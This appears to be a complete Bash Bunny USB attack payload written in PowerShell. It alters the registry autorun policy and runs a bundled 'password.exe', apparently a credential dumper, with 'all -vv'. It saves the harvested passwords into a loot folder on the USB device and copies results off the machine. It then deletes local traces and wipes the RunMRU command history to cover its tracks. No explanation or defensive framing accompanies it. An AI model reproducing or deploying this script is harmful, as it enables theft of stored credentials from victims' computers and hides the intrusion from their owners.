$path ='HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer'
Set-ItemProperty $path -Name NoDriveTypeAutorun -Type DWord -Value 0xFF
$dest = ((Get-WmiObject win32_volume -f 'label=''BashBunny''').Name+'loot\password')
$filter = 'password_'+ $env:COMPUTERNAME
$filecount = ((Get-ChildItem -filter ($filter + "*") -path $dest | Measure-Object | Select -ExpandProperty Count) + 1)
Start-Process -FilePath ((Get-WmiObject win32_volume -f 'label=''BashBunny''').Name+'payloads\switch1\password.exe') -ArgumentList 'all -vv' -RedirectStandardOutput ($dest +'\' + $filter +'_' + $filecount +'.txt') -wait 
Copy-Item -Path C:\Windows\System32\results -Destination ((Get-WmiObject win32_volume -f 'label=''BashBunny''').Name+'\loot\password\') -PassThru -Recurse
Remove-Item $env:USERPROFILE\results -ErrorAction SilentlyContinue -Recurse
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
exit